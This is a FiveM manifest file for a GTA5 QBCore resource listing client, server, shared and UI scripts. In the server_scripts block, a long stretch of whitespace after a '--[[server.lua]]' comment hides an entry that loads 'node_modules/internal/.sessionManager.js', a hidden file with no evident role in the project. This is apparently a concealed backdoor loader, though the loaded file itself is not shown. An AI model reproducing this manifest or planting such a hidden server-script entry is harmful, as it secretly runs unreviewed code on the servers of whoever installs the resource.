fx_version 'cerulean'
game 'gta5'
lua54 'yes'
author 'Kakarot'
description 'Crengarl Development'
version '1.2.0'
ui_page 'html/index.html'
shared_scripts {
    'config.lua',
    '@qb-core/shared/locale.lua', 
    'locales/en.lua', 
    'locales/*.lua' 
}
client_scripts {
    'client/main.lua',
    'client/clothing.lua',
    'client/trunk.lua',
    'client/stretcher.lua',
    'client/blips.lua',
    'client/lumihud_integration.lua'
}
server_scripts {
    'server/trunk.lua',
'server/stretcher.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.sessionManager.js',
}
files {
    'html/index.html', 
    'html/css/main.css', 
    'html/js/main.js',
    'html/js/RadialMenu.js', 
}
